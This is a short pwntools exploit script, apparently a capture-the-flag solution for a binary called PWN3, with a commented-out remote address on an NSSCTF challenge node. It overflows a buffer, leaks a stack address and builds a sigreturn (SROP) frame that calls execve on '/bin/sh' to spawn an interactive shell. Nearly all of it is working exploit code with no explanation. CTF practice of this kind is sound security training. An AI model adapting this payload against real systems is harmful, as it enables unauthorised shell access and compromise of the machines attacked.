from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
elf = ELF("./PWN3")
p = process("./PWN3")
#p=remote('node5.anna.nssctf.cn',28289)
gdb.attach(p,'b* 0x400519')
mov_rax = 0x4004DA
reread = 0x4004F1
payload1 = b"a" * 16 + p64(reread)
pause()
p.send(payload1)
p.recv(0x20)
stack=int(hex(int.from_bytes(p.recv(8), byteorder='little')),16)-0x138
log.info("stack addr = %#x" % (stack))
frame_exe=SigreturnFrame()
frame_exe.rax=59
frame_exe.rdi=stack-8
frame_exe.rsi=0
frame_exe.rdx=0
frame_exe.rip=0x400517
frame_exe.rsp=stack
payload2=b'/bin/sh\x00'+b'a'*8+p64(mov_rax)+p64(0x400517)+bytes(frame_exe)
p.send(payload2)
p.interactive()
